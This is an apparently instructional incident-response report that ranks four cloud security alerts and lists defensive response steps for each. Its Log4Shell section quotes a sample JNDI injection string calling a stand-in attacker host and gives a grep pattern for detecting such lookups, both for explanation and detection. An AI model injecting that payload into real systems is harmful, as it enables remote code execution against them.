# Part 2: Incident Response & Prioritization

## Scenario

On-call engineer receives four security alerts between 06:00–07:00 AM. This report ranks each by priority, provides immediate response actions, and details the reasoning using three evaluation axes:

| Axis | Description |
|---|---|
| **Likelihood of Exploitation** | How probable is active or imminent exploitation right now? |
| **Blast Radius** | How many systems, users, or data records are affected if exploited? |
| **Data Sensitivity** | What classification of data is at risk (PII, credentials, internal-only)? |

---

## Priority Ranking

### 🔴 Priority 1 — Alert D: Unauthenticated Snowflake Proxy Exposing Customer PII

**Alert:** A security researcher reports that `https://api.company.com/snowflake-proxy` allows unauthenticated SQL query execution against your production Snowflake instance. A working proof-of-concept demonstrates the ability to read table names. Customer PII is stored in Snowflake.

**Why this is #1:**

| Axis | Assessment | Rating |
|---|---|---|
| **Likelihood of Exploitation** | **Actively exploitable right now.** A working PoC exists and has been demonstrated by an external researcher. The endpoint is unauthenticated and publicly reachable — zero barriers to exploitation. There is no way to know if the researcher is the only one who found it, or if malicious actors have already exfiltrated data silently. | 🔴 CRITICAL |
| **Blast Radius** | **Entire customer PII dataset.** Snowflake is a data warehouse — a single SQL query can return millions of rows. Unlike a single-pod compromise, this is a direct pipeline to the crown jewels. The proxy allows arbitrary query execution, meaning the attacker can `SELECT *` from any table the proxy's service account has access to. | 🔴 CRITICAL |
| **Data Sensitivity** | **Customer PII** — the highest sensitivity tier. Exposure triggers regulatory obligations (GDPR, CCPA, state breach notification laws), potential class-action liability, and severe reputational damage. This is not internal data or infrastructure metadata — it is the data you are entrusted to protect. | 🔴 CRITICAL |

**Additional factors elevating priority:**
- **The PoC is in external hands.** Even if the researcher is acting in good faith, the vulnerability may have been independently discovered by malicious actors. The 15 stars/3 forks on the AWS key commit (Alert B) demonstrate how fast exposure propagates — this endpoint could already be indexed by Shodan or similar scanners.
- **No authentication = no audit trail.** Without authentication, there may be no logs of who has already accessed this endpoint or what queries were executed. You cannot scope the blast radius until you investigate.
- **Regulatory clock starts ticking.** If PII was accessed, most breach notification laws impose 72-hour (GDPR) or 30–60-day (US state laws) disclosure deadlines from the moment you become aware. That clock started when you received this email.

**Immediate Response (first 15 minutes):**

```
 1. BLOCK the endpoint immediately:
    - WAF/load balancer rule to deny all traffic to /snowflake-proxy
    - OR kill the proxy service/pod entirely
    - OR Snowflake network policy to restrict IP access to internal-only
    Verify the block by testing the PoC URL yourself.

 2. REVOKE the Snowflake service account credentials used by the proxy.
    Even after blocking the endpoint, the credentials may have been
    extracted and could be used directly against Snowflake.

 3. PRESERVE EVIDENCE before any remediation:
    - Export proxy service access logs (load balancer, CDN, Cloud Run/GKE)
    - Export Snowflake query history: QUERY_HISTORY_BY_WAREHOUSE()
    - Snapshot the proxy pod/container image for forensic analysis

 4. SCOPE THE EXPOSURE:
    - What Snowflake role does the proxy use? What tables can it access?
    - Review Snowflake QUERY_HISTORY for the past 30+ days
    - Identify any queries that read PII tables (look for unusual
      SELECT patterns, large result sets, unfamiliar source IPs)

 5. NOTIFY incident commander + legal team immediately.
    If evidence of PII access is found, activate the breach
    notification process.

 6. ACKNOWLEDGE the security researcher professionally.
    Thank them, confirm receipt, provide a timeline for remediation.
```

---

### 🔴 Priority 2 — Alert B: AWS Access Keys (AdministratorAccess) Committed to Public Repository

**Alert:** A developer committed AWS access keys to a public GitHub repository 2 hours ago. The keys belong to an IAM user with `AdministratorAccess` policy. The commit has 15 stars and 3 forks already. The AWS account hosts a legacy monitoring service (non-customer facing).

**Why this is #2:**

| Axis | Assessment | Rating |
|---|---|---|
| **Likelihood of Exploitation** | **Near-certain active exploitation.** AWS key scraping bots continuously scan public GitHub repos and can exploit leaked keys within minutes. The commit is 2 hours old with 15 stars and 3 forks — this is already widely visible. Automated attackers typically spin up cryptocurrency miners or exfiltrate data within seconds of discovery. It would be naive to assume these keys have not already been used. | 🔴 CRITICAL |
| **Blast Radius** | **Full AWS account compromise.** `AdministratorAccess` is the most privileged IAM policy — it grants unrestricted access to every AWS service in the account. An attacker can: create new IAM users/roles for persistence, access any S3 buckets, modify infrastructure, pivot to connected accounts, deploy backdoors, or destroy resources. Even though it hosts a "legacy monitoring service," the IAM user has admin access to the *entire account*. | 🔴 CRITICAL |
| **Data Sensitivity** | **Medium-High.** The account is described as non-customer-facing, which lowers the direct PII risk compared to Alert D. However, `AdministratorAccess` means the attacker can access *anything* in the account — there may be data, logs, backups, or cross-account trust relationships you haven't considered. Legacy systems are notoriously under-inventoried. | 🟠 HIGH |

**Why #2 and not #1:**
- Alert D exposes customer PII directly and immediately with zero friction. Alert B exposes an AWS account that is described as non-customer-facing. While `AdministratorAccess` is extremely dangerous, the immediate data sensitivity of Alert D (customer PII in Snowflake) outweighs the infrastructure risk of Alert B.
- However, Alert B is extraordinarily urgent because the exposure window is already 2+ hours with confirmed public visibility (stars/forks). Every minute without action increases the risk of lateral movement, persistence mechanisms, or data destruction.

**Immediate Response (first 10 minutes):**

```
 1. DISABLE the IAM access keys immediately via AWS Console or CLI:
    aws iam update-access-key --access-key-id AKIAXXXXXXXX \
      --status Inactive --user-name <username>
    Then DELETE them:
    aws iam delete-access-key --access-key-id AKIAXXXXXXXX \
      --user-name <username>

 2. CHECK for unauthorized activity in the AWS account:
    - CloudTrail: Review events from the past 2+ hours for the
      compromised access key
    - Look for: CreateUser, CreateAccessKey, AttachUserPolicy,
      RunInstances, CreateRole, AssumeRole, S3 GetObject/PutObject
    - Check for any new IAM users, roles, or policies created
      (persistence backdoors)

 3. REVOKE any active sessions:
    - Attach an inline deny-all policy to the IAM user
    - If STS temporary credentials were issued, they remain valid
      until expiry — revoke active sessions via IAM console

 4. AUDIT the full AWS account:
    - List all IAM users, roles, and access keys
    - Check for cross-account trust relationships
    - Inventory S3 buckets and their public/private status
    - Review EC2 instances for unauthorized resources (crypto miners)

 5. REMOVE the commit from GitHub:
    - Use git filter-branch or BFG Repo Cleaner to purge the secret
      from git history (just deleting the file leaves it in history)
    - Contact GitHub support to purge cached copies
    - Note: The 3 forks already have the keys — those are beyond
      your control. The keys MUST be rotated, not just hidden.

 6. ROTATE credentials:
    - Generate new access keys if the IAM user is still needed
    - Evaluate whether this IAM user should exist at all
    - Enforce MFA and reduce to least-privilege policy
```

---

### 🟠 Priority 3 — Alert A: Log4Shell (CVE-2021-44228) in Internal Admin Dashboard

**Alert:** 8 production GKE pods are running container images vulnerable to Log4Shell. The affected service is an internal admin dashboard that requires VPN + authentication and is used by 50 employees. Threat intel reports the vulnerability was last exploited in the wild 18 hours ago.

**Why this is #3:**

| Axis | Assessment | Rating |
|---|---|---|
| **Likelihood of Exploitation** | **Low-Medium, given mitigating controls.** Log4Shell is a critical RCE vulnerability (CVSS 10.0) with widespread exploitation. However, the affected service requires VPN access AND authentication, meaning an external attacker must first compromise the VPN or an employee's credentials before they can even reach the vulnerable service. This significantly reduces the attack surface compared to internet-facing endpoints. The "last exploited 18 hours ago" threat intel confirms ongoing campaigns, but those campaigns target *internet-reachable* Log4j instances. | 🟡 MEDIUM |
| **Blast Radius** | **Moderate.** The admin dashboard is internal and used by 50 employees. If exploited via an insider threat or compromised VPN, the attacker gains RCE on 8 pods within the GKE cluster, potentially enabling lateral movement to other workloads. Admin dashboards often have elevated privileges to backend systems. However, this does not directly expose customer-facing data at the scale of Alerts D or B. | 🟡 MEDIUM |
| **Data Sensitivity** | **Medium.** As an admin dashboard, it likely has access to operational data, system configurations, and potentially employee or limited customer data. The sensitivity depends on what the dashboard can access — this needs investigation. | 🟡 MEDIUM |

**Why #3 and not higher:**
- The VPN + authentication requirement creates two defense layers that Alerts D (unauthenticated) and B (public GitHub) do not have.
- Log4Shell is serious, but the *reachability* of the vulnerable service is limited. An attacker needs to be on the VPN (insider or compromised employee) to exploit it.
- This is a vulnerability (potential exploit) rather than an active exposure (Alerts D and B are already exposed with evidence of external access).

**Why #3 and not #4:**
- Log4Shell is a proven RCE with trivial exploitation once reachable — a single crafted log message (e.g., `${jndi:ldap://attacker.com/x}`) achieves remote code execution.
- Active threat intel confirms exploitation 18 hours ago — this is not a theoretical risk.
- Admin dashboards often have privileged access to backend systems, making post-exploitation impact significant.
- Alert C (below) is a configuration weakness, not an actively exploitable vulnerability with known campaigns.

**Immediate Response (within 1 hour):**

```
 1. PATCH immediately:
    - Rebuild container images with Log4j ≥ 2.17.1 (or latest 2.x)
    - If immediate rebuild is not possible, apply mitigation:
      Set environment variable: LOG4J_FORMAT_MSG_NO_LOOKUPS=true
      Or JVM flag: -Dlog4j2.formatMsgNoLookups=true

 2. DEPLOY patched images to the 8 affected pods:
    - Rolling update in GKE: kubectl set image deployment/admin-dashboard ...
    - Verify pods are running the patched image

 3. CHECK for prior exploitation:
    - Search logs for JNDI lookup patterns:
      grep -i 'jndi:ldap\|jndi:rmi\|jndi:dns\|jndi:iiop' in pod logs
    - Review outbound network connections from the admin dashboard
      pods for unexpected external destinations
    - Check GKE audit logs for anomalous pod behavior

 4. HARDEN the admin dashboard:
    - Ensure network policies restrict egress from these pods
      (Log4Shell requires outbound LDAP/RMI connections to exploit)
    - Review WAF rules for JNDI pattern blocking
    - Confirm VPN access is limited to authorized employees only

 5. ADD to vulnerability management pipeline:
    - Ensure container scanning gates in CI/CD block images with
      critical CVEs from reaching production
    - Schedule recurring scans for all GKE workloads
```

---

### 🟡 Priority 4 — Alert C: GKE Workload Identity Disabled, Service Account JSON Keys in Use

**Alert:** GKE Workload Identity is disabled on the production cluster `prod-us-west1`. 12 pods are using downloaded service account JSON keys mounted as Kubernetes secrets. The cluster runs the customer-facing verification API handling 50K requests/minute.

**Why this is #4:**

| Axis | Assessment | Rating |
|---|---|---|
| **Likelihood of Exploitation** | **Low in isolation.** This is a *configuration weakness*, not an actively exploitable vulnerability. There is no CVE, no PoC, no external attacker at the door. For this to be exploited, an attacker would first need to compromise a pod (via an application-level vulnerability) or gain access to the Kubernetes API, and then extract the mounted JSON key. It's a *second-order* risk — it amplifies the impact of other vulnerabilities but is not directly exploitable on its own. | 🟢 LOW |
| **Blast Radius** | **Potentially high if combined with another exploit.** The cluster runs the customer-facing verification API at 50K req/min. If a pod is compromised and the attacker extracts a service account JSON key, the blast radius depends on what IAM roles are bound to that service account. Static JSON keys don't expire and can be used from anywhere, unlike Workload Identity tokens that are short-lived and bound to the pod's identity. The 12 affected pods multiply the number of keys that could be stolen. | 🟠 HIGH (conditional) |
| **Data Sensitivity** | **High infrastructure sensitivity.** The service account keys could grant access to GCP resources (Cloud SQL, Cloud Storage, BigQuery, etc.) depending on their IAM bindings. The verification API handles customer data, so the associated service accounts likely have access to sensitive backend resources. | 🟠 HIGH (conditional) |

**Why #4:**
- This is a **security posture issue**, not an **active incident**. The other three alerts involve either confirmed external exposure (D, B) or a known actively-exploited vulnerability (A).
- No attacker is currently exploiting this. It requires a *prior compromise* of a pod or the Kubernetes control plane to become actionable.
- The fix (enabling Workload Identity and rotating keys) is an infrastructure migration, not an emergency patch. It should be done urgently but can be planned, unlike the immediate "stop the bleeding" actions required for Alerts D, B, and A.
- The CSPM tool correctly flagged this as a risk — it increases the *dwell time* impact of any future pod compromise. But today, at 06:00 AM during triage, the other three alerts are burning.

**Response (within 24–48 hours, planned remediation):**

```
 1. INVENTORY the service accounts in use:
    - Which GCP service accounts are used by the 12 pods?
    - What IAM roles/permissions does each have?
    - Principle of least privilege: do any have overly broad roles
      like roles/editor or roles/owner?

 2. AUDIT existing JSON keys:
    - When were they created? By whom?
    - Are there multiple keys per service account? (max 10 per SA)
    - Have any keys been used from unexpected IP addresses?
      Check: gcloud iam service-accounts keys list
      Cross-reference with Cloud Audit Logs

 3. PLAN Workload Identity migration:
    - Enable Workload Identity on the prod-us-west1 cluster
    - Create Kubernetes Service Accounts (KSAs) for each workload
    - Bind KSAs to GCP Service Accounts via IAM policy binding
    - Update pod specs to use KSA instead of mounted JSON keys
    - Test in staging first — this affects the 50K req/min API

 4. ROTATE and DELETE the static JSON keys:
    - After Workload Identity is active and verified, delete the old
      JSON keys from both GCP IAM and Kubernetes secrets
    - Monitor for any failures caused by key removal

 5. ENFORCE via policy:
    - Organization Policy: constraints/iam.disableServiceAccountKeyCreation
    - GKE Policy: require Workload Identity on all new clusters
    - CSPM rule to alert if JSON keys are detected in any cluster
```

---

## Priority Summary

| Priority | Alert | Threat Type | Likelihood | Blast Radius | Data Sensitivity | Time to Respond |
|---|---|---|---|---|---|---|
| **1** | **D** — Snowflake Proxy | Unauthenticated data exposure | 🔴 Active | 🔴 All customer PII | 🔴 Customer PII | **Immediately** |
| **2** | **B** — AWS Key Leak | Credential exposure (public) | 🔴 Active (bots) | 🔴 Full AWS account | 🟠 Non-customer (but admin) | **Within 10 min** |
| **3** | **A** — Log4Shell | Known RCE vulnerability | 🟡 Mitigated (VPN+auth) | 🟡 8 internal pods | 🟡 Internal/admin data | **Within 1 hour** |
| **4** | **C** — Workload Identity | Configuration weakness | 🟢 Requires prior compromise | 🟠 Conditional on SA perms | 🟠 Conditional | **24–48 hours** |

---

## Triage Decision Framework

The ranking follows a **"fire closest to the customer data"** principle:

```
                    ┌────────────────────────┐
                    │   Is customer PII at   │
                    │   immediate risk?      │
                    ├──────┬─────────────────┤
                    │ YES  │       NO        │
                    ▼      │                 ▼
              Priority 1   │   ┌─────────────────────┐
              (Alert D)    │   │ Are credentials      │
                           │   │ actively exposed     │
                           │   │ to the internet?     │
                           │   ├──────┬──────────────┤
                           │   │ YES  │      NO      │
                           │   ▼      │              ▼
                           │ Priority 2  ┌───────────────────┐
                           │ (Alert B)   │ Is there a known  │
                           │             │ RCE with active    │
                           │             │ exploitation?      │
                           │             ├──────┬────────────┤
                           │             │ YES  │     NO     │
                           │             ▼      │            ▼
                           │         Priority 3  │      Priority 4
                           │         (Alert A)   │      (Alert C)
                           │                     │   Configuration
                           │                     │   weakness —
                           │                     │   plan & fix
                           └─────────────────────┘
```

**Key principle:** An active, unauthenticated exposure to customer data (D) is always more urgent than a credential leak to non-customer infrastructure (B), which is more urgent than a vulnerability behind VPN+auth (A), which is more urgent than a configuration weakness requiring a prior compromise to exploit (C).

---

## References

- **CVE-2021-44228** — Apache Log4j Remote Code Execution (Log4Shell), CVSS 10.0
- **NIST SP 800-61 Rev. 2** — Computer Security Incident Handling Guide
- **GCP Workload Identity** — [cloud.google.com/kubernetes-engine/docs/concepts/workload-identity](https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity)
- **AWS IAM Best Practices** — [docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)
- **GitHub Secret Scanning** — [docs.github.com/en/code-security/secret-scanning](https://docs.github.com/en/code-security/secret-scanning)
- **Snowflake Access Control** — [docs.snowflake.com/en/user-guide/security-access-control](https://docs.snowflake.com/en/user-guide/security-access-control)
